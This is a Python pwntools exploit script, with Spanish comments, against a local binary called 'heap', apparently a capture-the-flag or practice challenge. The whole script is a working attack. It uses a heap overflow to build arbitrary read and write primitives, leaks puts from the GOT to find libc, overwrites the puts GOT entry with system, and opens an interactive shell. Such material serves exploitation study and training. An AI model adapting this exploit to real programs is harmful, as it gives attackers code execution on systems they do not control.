#!/usr/bin/python3

from pwn import *

# Depende del sistema
libp = "/lib/x86_64-linux-gnu/libc.so.6"

# Hay que encontrarlo con el debugger
ARRAY_OFFSET = 0x40c0
USER_NAME = "bash"

# Cargamos los binarios para tener los símbolos
elf = ELF("./heap")
io = process(elf.path)
lib = ELF(libp)


# Funciones para automatizar funcionalidades básicas
def choose_name(name):
    io.recvuntil("¿Como te llamas?")
    io.sendline(name)

def setup():
    choose_name(USER_NAME)
    add_heapmon(0, "A")
    add_heapmon(1, "A")
    elf.address = int(leak_addr(), 0) - ARRAY_OFFSET

def leak_addr():
    io.sendline("6")
    io.recvuntil("chunks: ")
    return io.recvline(keepends=False)

def add_heapmon(idx, name):
    io.sendline("0")
    io.sendline(str(idx))
    io.sendline(name)
    io.sendline("0")
    io.sendline("0")
    io.sendline("0")
    io.sendline("0")

def edit_heapmon(idx, name):
    io.sendline("1")
    io.sendline(str(idx))
    io.sendline(name)
    io.sendline("0")
    io.sendline("0")
    io.sendline("0")
    io.sendline("0")

def see_heapmon(idx):
    io.sendline("3")
    io.sendline(str(idx))
    io.recvuntil("Tu Heapmon ")
    return io.recvline()

# En base a la funcionalidad básica sacamos un read-everywhere
def read(addr):
    offset = 32
    payload = offset * b'A' + p64(addr)
    edit_heapmon(0, payload)
    return u64(see_heapmon(1).split(b" ")[0] + b"\x00" * 2)

# En base a la funcionalidad básica sacamos un write-everywhere
def write(addr, data):
    offset = 32
    payload = offset * b'A' + p64(addr)
    edit_heapmon(0, payload)
    edit_heapmon(1, p64(data))

# Hacemos un leak con una función ya usada para sacar la libc_base
def libc_base():
    puts = read(elf.got["puts"])
    log.success("puts address: " + hex(int(puts)))
    return int(puts) - lib.sym["puts"]

#gdb.attach(io, "b menu")

setup()

# Sacamos la libc para poder modificar la GOT
lib.address = libc_base()
log.success("libc address: " + hex(lib.address))
log.success("system address: " + hex(lib.sym["system"]))

write(elf.got["puts"], lib.sym["system"])

io.interactive()
